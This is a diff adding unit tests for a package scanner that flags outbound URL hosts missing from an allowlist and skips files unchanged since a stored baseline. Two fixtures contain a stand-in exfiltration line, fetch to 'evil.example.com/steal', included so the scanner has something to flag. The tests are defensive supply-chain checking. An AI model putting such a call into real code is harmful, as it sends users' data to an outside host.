@@ -168,4 +168,80 @@ describe("runStaticChecks — the chalk/debug pattern", () => {
     });
     expect(runStaticChecks(pkgDir)).toEqual([]);
   });
+
+  it("does NOT flag .js / .mjs / .cjs filenames as unallowed hosts (#1649 review P1)", () => {
+    // The original bare-TLD regex matched 'index.js', 'cli.cjs', 'foo.mjs'
+    // as hosts, locking ESM packages into permanent scan_rejected state.
+    // The URL-only regex must NOT match these.
+    const pkgDir = writePackage({
+      "package.json": JSON.stringify({ name: "x", version: "1.0.0" }),
+      "lib/loader.js":
+        "import x from './index.js';\nconst y = require('./cli.cjs');\nexport * from './foo.mjs';",
+    });
+    const flags = runStaticChecks(pkgDir, {
+      hostnameAllowlist: ["openai.com"],
+      baseline: { fileHashes: {} },
+    });
+    expect(flags.filter((f: string) => f.startsWith("unallowed_host:"))).toEqual(
+      [],
+    );
+  });
+
+  it("flags an actual outbound URL host that is not on the allowlist", () => {
+    const pkgDir = writePackage({
+      "package.json": JSON.stringify({ name: "x", version: "1.0.0" }),
+      "lib/exfil.js": 'fetch("https://evil.example.com/steal");',
+    });
+    const flags = runStaticChecks(pkgDir, {
+      hostnameAllowlist: ["openai.com"],
+      baseline: { fileHashes: {} },
+    });
+    expect(
+      flags.some((f: string) =>
+        f.startsWith("unallowed_host:lib/exfil.js:evil.example.com"),
+      ),
+    ).toBe(true);
+  });
+
+  it("does NOT re-flag an unallowed host in a file whose content didn't change vs baseline (#1649 review P1)", async () => {
+    // Even if the host was somehow flagged once, an unchanged file must
+    // not lock the package into permanent scan_rejected state on every
+    // subsequent update.
+    const pkgDir = writePackage({
+      "package.json": JSON.stringify({ name: "x", version: "1.0.0" }),
+      "lib/u.js": 'fetch("https://evil.example.com/steal");',
+    });
+    const moduleUrl = new URL(
+      "../../bin/browser-local/cli-scanner.mjs",
+      import.meta.url,
+    ).href;
+    const { computeSha512 } = await import(/* @vite-ignore */ moduleUrl);
+    const baselineHash = computeSha512(path.join(pkgDir, "lib/u.js"));
+    const flags = runStaticChecks(pkgDir, {
+      hostnameAllowlist: ["openai.com"],
+      baseline: { fileHashes: { "lib/u.js": baselineHash } },
+    });
+    expect(
+      flags.filter((f: string) => f.startsWith("unallowed_host:")),
+    ).toEqual([]);
+  });
+});
+
+describe("baseline seeding (#1649 review P0)", () => {
+  // findGlobalPackageDirectory + buildBaselineFromInstalled make a network
+  // call (`npm root -g`); we don't drive npm in unit tests. The integration
+  // assertion that matters is exercised in the updater's failure-paths
+  // suite (#1645): when seed returns null, the updater must refuse to
+  // install rather than fall through to no_baseline. That guarantees no
+  // existing user runs an unscanned first published-tarball update.
+  it("buildBaselineFromInstalled is exported for the updater to call before scanning", async () => {
+    const moduleUrl = new URL(
+      "../../bin/browser-local/cli-scanner.mjs",
+      import.meta.url,
+    ).href;
+    const { buildBaselineFromInstalled } = await import(
+      /* @vite-ignore */ moduleUrl
+    );
+    expect(typeof buildBaselineFromInstalled).toBe("function");
+  });
 });
